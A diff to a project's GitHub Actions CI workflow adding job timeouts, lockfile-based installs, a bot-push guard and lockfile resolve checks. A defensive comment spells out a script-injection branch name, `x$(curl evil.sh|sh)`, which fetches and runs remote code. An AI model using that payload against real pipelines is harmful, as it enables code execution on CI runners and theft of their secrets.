@@ -19,6 +19,13 @@ jobs:
   test:
     name: Tests (py${{ matrix.python-version }} · ${{ matrix.os }})
     runs-on: ${{ matrix.os }}
+    # Every job here sets one (#697). Without it the ceiling is GitHub's six-hour
+    # default, and a resolve that stalls against a slow index holds a required
+    # check *open* rather than failing it — worse than a failure, because nothing
+    # is reported and nobody is told. The wrappers below are the
+    # diagnosis; this is the backstop under them, and the ceiling test in
+    # `tests/test_publish_release_chain.py` checks it clears their sum.
+    timeout-minutes: 20
     strategy:
       fail-fast: false
       matrix:
@@ -37,10 +44,37 @@ jobs:
       - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
         with:
           python-version: ${{ matrix.python-version }}
+      # `timeout(1)` is GNU coreutils and the `macos-latest` runner ships neither
+      # it nor `gtimeout`, so a `timeout 300` here exits 127 on that leg before
+      # pip is reached — a red required check on every pull request rather than a
+      # bound. One step serves all five matrix legs, so the bound has to be one
+      # all five have, and `bounded` is that: `subprocess.run(timeout=…)`, which
+      # kills the child and exits non-zero on Linux, macOS and Windows alike. The
+      # interpreter is the one `setup-python` installed in the step above, so it
+      # is already here and is the same on every leg.
+      #
+      # Not perl's `alarm shift; exec @ARGV`, which is the shorter spelling and
+      # works on the two POSIX legs: it relies on the alarm surviving an `exec`,
+      # and on Windows nothing in this repository can check that it does. A bound
+      # that silently is not one is the thing being fixed.
+      #
+      # Not `pip --timeout` either: that is pip's *socket* timeout, a bound on one
+      # quiet read rather than on the call, so a peer that sends a byte inside
+      # every window holds the resolve open regardless. Writing it here would look
+      # like a bound while adding none, which is worse than the honest gap.
+      #
+      # `tests/test_publish_release_chain.py` reads `bounded` as a wrapper, counts
+      # its seconds against the job's ceiling, and fails if a step calls it
+      # without defining it — a function dies with its step, so a call in another
+      # one is `command not found` under a name the scan trusts.
       - name: Install package
+        # bash on all three runners (git-bash on Windows), so one spelling of the
+        # wrapper serves the whole matrix.
+        shell: bash
         run: |
-          python -m pip install --upgrade pip
-          python -m pip install -e .
+          bounded() { python -c 'import subprocess,sys; sys.tracebacklimit=0; sys.exit(subprocess.run(sys.argv[2:], timeout=float(sys.argv[1])).returncode)' "$@"; }
+          bounded 120 python -m pip install --upgrade pip
+          bounded 300 python -m pip install -e .
       - name: Run offline (mock) unit tests
         run: python -m unittest discover -s tests -v
       - name: Smoke-test the CLI in mock mode
@@ -55,18 +89,48 @@ jobs:
   lint:
     name: Lint + format (ruff)
     runs-on: ubuntu-latest
+    timeout-minutes: 15
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
       - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
         with:
           python-version: "3.13"
-      # Pinned, and pinned to the SAME version as the `ruff-format` hook in
-      # .pre-commit-config.yaml — `tests/test_ruff_pin.py` asserts they match.
-      # The dev extra is `ruff>=0.6`, and a format gate on a floating formatter
-      # goes red on ruff's release schedule rather than on anything in this
-      # repository. That is the failure that teaches people to ignore a check.
-      - name: Install ruff (pinned to the pre-commit hook)
-        run: python -m pip install --upgrade pip && pip install "ruff==0.16.3"
+      # The bootstrap, and the only install on this path that does not come out
+      # of a lock: `uv` itself, hash-locked the way publish.yml's build tooling
+      # has been since #712. `release lockfiles resolve` below dry-runs this file
+      # on every pull request, so a wheel PyPI stops serving fails there.
+      - name: Install uv (hash-locked)
+        run: |
+          timeout 300 python -m pip install --timeout 30 \
+            --require-hashes --only-binary=:all: \
+            -r .github/requirements/ci-tools.txt
+      # Ruff's version lives in `uv.lock` now, and `tests/test_ruff_pin.py`
+      # asserts the lock and the `ruff-format` hook in .pre-commit-config.yaml
+      # name the same one. Until #751 this step pinned a ruff by hand while the
+      # `coverage` job installed `ruff>=0.6` through the dev extra, so one CI run
+      # could hold two formatters — and the lock that would have settled it was
+      # tracked, maintained as a release surface, and read by nothing.
+      #
+      # `--locked` rather than `--frozen`: a lock that no longer matches
+      # pyproject.toml has to fail here. `--frozen` would install a stale lock
+      # quietly, which is the failure this change exists to end.
+      #
+      # `--no-install-project` because ruff imports nothing from the package —
+      # and because building the project would fetch a build backend this lock
+      # does not cover, which is a resolve worth not making at all.
+      #
+      # `--python` is not optional. uv prefers its own managed interpreters, so
+      # without it this job can sync against a Python `setup-python` never
+      # installed. `$pythonLocation` is the env var `setup-python` exports, read
+      # by bash rather than pasted in as an Actions expression (#683).
+      #
+      # `.venv/bin` on $GITHUB_PATH is what leaves the two steps below spelled
+      # exactly as they were.
+      - name: Install ruff from uv.lock
+        run: |
+          timeout 300 uv sync --locked --no-install-project --extra dev \
+            --python "$pythonLocation/bin/python"
+          echo "$PWD/.venv/bin" >> "$GITHUB_PATH"
       - name: Lint
         run: ruff check .
       # Without this the tree drifts back: `ruff-format` is a *rewriting* hook,
@@ -84,6 +148,7 @@ jobs:
     # monotonicity comparison silently did nothing on every run.
     name: Version integrity (silent-revert guard)
     runs-on: ubuntu-latest
+    timeout-minutes: 15
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
         with:
@@ -96,21 +161,101 @@ jobs:
       - name: Verify version markers agree and do not regress
         run: python scripts/verify_merge.py --check-version
 
+  bot-push-guard:
+    # A bot-owned pull request branch is a read-only input (CONTRIBUTING.md). The
+    # bot pushes from its own checkout, so once a human has touched the branch the
+    # bot's next push replaces the reviewed tree with its stale copy — that is how
+    # #648 silently reverted two merged PRs on 2026-09-03 while the only signal was
+    # an unexplained red suite. This job names both commits instead (#676).
+    #
+    # OPERATOR NOTE — this job is not self-enforcing. On `pull_request` both the
+    # workflow and the script are taken from the *pull request head*, so a stale
+    # bot push that predates the guard (28d9cc3c on #648 deleted 25 files, two
+    # workflows among them) removes the job and GitHub creates no check run for
+    # it at all. Nothing in this file can prevent that: the fix is branch
+    # protection. Add `Bot push guard` to main's required status checks — a
+    # required context that never reports blocks the merge, which is the whole
+    # point. The name is load-bearing once it is registered there; renaming it
+    # leaves the old context required and never reported, so do not.
+    #
+    # Pull requests only: there is no branch to reason about on a push to main.
+    name: Bot push guard
+    if: github.event_name == 'pull_request'
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    permissions:
+      contents: read
+      # The commit list is read from the API, not from the checkout, so a
+      # force-pushed branch is described by what GitHub has rather than by what a
+      # shallow clone happens to contain.
+      pull-requests: read
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
+        with:
+          python-version: "3.13"
+      # The refs come from the event payload, so a branch the rule does not cover
+      # is answered without touching the API at all.
+      #
+      # Every one of them travels through `env:`, and NOTHING below interpolates
+      # a `${{ }}` expression into the script. A branch name is attacker-chosen
+      # data on a fork pull request and git permits `$( )`, backticks and quotes
+      # inside a ref, so an expression pasted into `run:` is substituted into the
+      # shell source *before* bash parses it — a branch called
+      # `x$(curl evil.sh|sh)` would execute in this job on every pull request.
+      # As an environment variable the same name is inert bytes. The offline
+      # suite asserts this block stays expression-free.
+      - name: Detect a bot push following a human push
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          BASE_REF: ${{ github.event.pull_request.base.ref }}
+        # Wrapped even though the scan does not recognise a bare `python` as a
+        # network client: this script reads the commit list from the API, so it
+        # is a request like any other and a hung one holds this check open.
+        run: |
+          timeout 120 python scripts/bot_push_after_human_push_check.py \
+            --repo "$REPO" \
+            --pr "$PR_NUMBER" \
+            --head-ref "$HEAD_REF" \
+            --base-ref "$BASE_REF"
+
   coverage:
     name: Coverage gate
     # One dedicated job on a single OS/Python keeps the matrix cheap and avoids
     # cross-OS path noise. The threshold (fail_under) lives in pyproject.toml
     # under [tool.coverage.report].
     runs-on: ubuntu-latest
+    timeout-minutes: 30
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
       - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
         with:
           python-version: "3.13"
-      - name: Install package with dev tools
+      - name: Install uv (hash-locked)
         run: |
-          python -m pip install --upgrade pip
-          python -m pip install -e ".[dev]"
+          timeout 300 python -m pip install --timeout 30 \
+            --require-hashes --only-binary=:all: \
+            -r .github/requirements/ci-tools.txt
+      # Was `pip install -e ".[dev]"`, which resolved `ruff>=0.6`, `build>=1.2`
+      # and `coverage>=7.5` fresh on every run: a coverage gate whose measuring
+      # instrument arrives from somebody else's release schedule, and three open
+      # upper bounds behind a required check (#751). They come from `uv.lock`
+      # now, hash by hash, and `--locked` fails the job on a lock that no longer
+      # matches pyproject.toml — so the lock is exercised rather than merely
+      # maintained. See the `lint` job above for why `--python` is spelled out.
+      #
+      # The project is still installed, unlike in `lint`: coverage measures
+      # `ai_jury` by import name. That build resolves `setuptools>=68` in an
+      # isolated build environment, which is the one fetch on this path `uv.lock`
+      # does not cover — it locks dependencies, not build backends.
+      - name: Install package with dev tools (from uv.lock)
+        run: |
+          timeout 300 uv sync --locked --extra dev \
+            --python "$pythonLocation/bin/python"
+          echo "$PWD/.venv/bin" >> "$GITHUB_PATH"
       - name: Run tests under coverage
         run: python -m coverage run -m unittest discover -s tests
       - name: Enforce minimum coverage
@@ -134,6 +279,7 @@ jobs:
     # green throughout.
     name: Action pins match upstream
     runs-on: ubuntu-latest
+    timeout-minutes: 20
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
       - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
@@ -144,7 +290,7 @@ jobs:
           AI_JURY_CHECK_PINS: "1"
           # Lifts the anonymous API rate limit; read-only, no extra scope needed.
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: python -m unittest tests.test_action_pins -v
+        run: timeout 300 python -m unittest tests.test_action_pins -v
 
       # Lives in this job because it needs the same thing: network, and a job
       # that is already a required check. The job keeps its name deliberately —
@@ -155,9 +301,65 @@ jobs:
       # they never ran: AI_JURY_CHECK_EXTERNAL was set nowhere in CI. A stale
       # digest shipped with 1.15.0 and surfaced as an hourly failure in the tap
       # repository instead (#630).
-      - name: Verify the Homebrew formula against the artifact it names
+      #
+      # Since #666 the subject is the *tap's* formula, not a copy in this
+      # repository — there is no copy here any more. It is never compared with
+      # this branch's version: the tap is written after the tag, so it is
+      # legitimately behind between a release and its next sync, and failing a
+      # pull request over that is the gate that made every release pull request
+      # unmergeable. What fails is a tap that cannot install.
+      - name: Verify the Homebrew tap serves an installable formula
         env:
           AI_JURY_CHECK_EXTERNAL: "1"
           PYTHONPATH: src
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: python -m unittest tests.test_homebrew_formula -v
+        run: timeout 300 python -m unittest tests.test_homebrew_formula -v
+
+      # Same reason again: nothing offline can tell a right Subresource Integrity
+      # hash from a wrong one, and a wrong one makes every reader's browser refuse
+      # the docs page's scripts. The way that happens is a CDN version bumped
+      # without its hash, so the scripts are fetched and hashed here (#817).
+      - name: Verify the docs page's CDN scripts match their integrity hashes
+        env:
+          AI_JURY_CHECK_EXTERNAL: "1"
+        run: timeout 300 python -m unittest tests.test_website_sri -v
+
+  release-lockfiles:
+    # publish.yml runs only on a v* tag, so a pin in .github/requirements that
+    # PyPI no longer serves, or a hash that no longer matches, would surface
+    # during a release rather than in CI. Nothing offline can tell a good pin
+    # from a bad one — only the real resolver can — so this runs the real thing:
+    # same OS, same Python, same flags as publish.yml, minus the install (#712).
+    #
+    # Since #751 it dry-runs the CI bootstrap on the same terms. That file is
+    # not release tooling and the job's name says "release", which is a mismatch
+    # the name has to keep: `Release lockfiles resolve` is a required context in
+    # main's branch protection, and a required context that is never reported
+    # blocks every merge permanently. The name is load-bearing; the coverage is
+    # every hash-locked file under .github/requirements.
+    name: Release lockfiles resolve
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97  # v7.0.0
+        with:
+          # Must match publish.yml's Python: the file is locked to one ABI, and
+          # resolving it under a different one proves nothing about the release.
+          python-version: "3.13"
+      - name: Resolve the hash-locked release tooling
+        run: |
+          timeout 300 python -m pip install --timeout 30 --dry-run \
+            --require-hashes --only-binary=:all: \
+            --target "$(mktemp -d)" -r .github/requirements/publish-tools.txt
+      # The same question about the other file: `lint`, `coverage` and the Pages
+      # deploy install `uv` from it before they read `uv.lock`, so a wheel that
+      # stops resolving takes out three jobs at once. Resolved here rather than
+      # discovered there, and separately from the file above because the two
+      # describe different runtimes and a shared resolve would not say which one
+      # broke.
+      - name: Resolve the hash-locked CI tooling
+        run: |
+          timeout 300 python -m pip install --timeout 30 --dry-run \
+            --require-hashes --only-binary=:all: \
+            --target "$(mktemp -d)" -r .github/requirements/ci-tools.txt
